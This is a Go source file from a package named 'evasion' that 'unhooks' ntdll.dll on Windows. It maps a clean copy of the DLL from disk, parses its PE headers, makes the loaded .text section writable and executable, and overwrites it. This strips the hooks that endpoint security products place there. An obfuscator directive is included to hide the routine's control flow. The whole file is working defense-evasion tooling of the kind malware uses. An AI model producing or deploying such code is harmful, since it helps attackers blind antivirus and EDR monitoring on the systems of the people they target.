//go:build windows
// +build windows

package evasion

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	imageDosSignature   = 0x5A4D
	imageNtSignature    = 0x00004550
	imageSectionExecute = 0x20000000
)

type imageDosHeader struct {
	Magic  uint16
	_      [28]uint16
	LfaNew int32
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	_                    [12]byte
	SizeOfOptionalHeader uint16
	_                    uint16
}

type imageSectionHeader struct {
	Name             [8]byte
	VirtualSize      uint32
	VirtualAddress   uint32
	SizeOfRawData    uint32
	PointerToRawData uint32
	_                [12]byte
	Characteristics  uint32
}

func UnhookNtdll() error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2

	ntdllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\ntdll.dll`)

	fHandle, err := syscall.CreateFile(
		ntdllPath,
		syscall.GENERIC_READ,
		syscall.FILE_SHARE_READ,
		nil,
		syscall.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return fmt.Errorf("CreateFile ntdll: %w", err)
	}
	defer syscall.CloseHandle(fHandle)

	mapping, err := syscall.CreateFileMapping(fHandle, nil, syscall.PAGE_READONLY, 0, 0, nil)
	if err != nil {
		return fmt.Errorf("CreateFileMapping: %w", err)
	}
	defer syscall.CloseHandle(mapping)

	cleanBase, err := syscall.MapViewOfFile(mapping, syscall.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		return fmt.Errorf("MapViewOfFile: %w", err)
	}
	defer syscall.UnmapViewOfFile(cleanBase)

	hookedModule, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadDLL ntdll: %w", err)
	}
	hookedBase := uintptr(hookedModule.Handle)

	return overwriteTextSection(cleanBase, hookedBase)
}

func overwriteTextSection(cleanBase, hookedBase uintptr) error {
	dosHeader := (*imageDosHeader)(unsafe.Pointer(cleanBase))
	if dosHeader.Magic != imageDosSignature {
		return fmt.Errorf("invalid DOS signature")
	}

	peOffset := cleanBase + uintptr(dosHeader.LfaNew)
	peSignature := *(*uint32)(unsafe.Pointer(peOffset))
	if peSignature != imageNtSignature {
		return fmt.Errorf("invalid PE signature")
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(peOffset + 4))
	sectionOffset := peOffset + 4 + unsafe.Sizeof(imageFileHeader{}) + uintptr(fileHeader.SizeOfOptionalHeader)

	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		section := (*imageSectionHeader)(unsafe.Pointer(sectionOffset + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))

		if sectionName(section) != ".text" {
			continue
		}

		if section.Characteristics&imageSectionExecute == 0 {
			continue
		}

		cleanTextAddr := cleanBase + uintptr(section.PointerToRawData)
		hookedTextAddr := hookedBase + uintptr(section.VirtualAddress)
		textSize := uintptr(section.VirtualSize)

		var oldProtect uint32
		if err := virtualProtect(hookedTextAddr, textSize, pageExecuteReadWrite, &oldProtect); err != nil {
			return fmt.Errorf("VirtualProtect RWX: %w", err)
		}

		for j := uintptr(0); j < textSize; j++ {
			*(*byte)(unsafe.Pointer(hookedTextAddr + j)) = *(*byte)(unsafe.Pointer(cleanTextAddr + j))
		}

		if err := virtualProtect(hookedTextAddr, textSize, oldProtect, &oldProtect); err != nil {
			return fmt.Errorf("VirtualProtect restore: %w", err)
		}

		return nil
	}

	return fmt.Errorf(".text section not found")
}

func sectionName(s *imageSectionHeader) string {
	n := s.Name[:]
	end := len(n)
	for i, b := range n {
		if b == 0 {
			end = i
			break
		}
	}
	return string(n[:end])
}
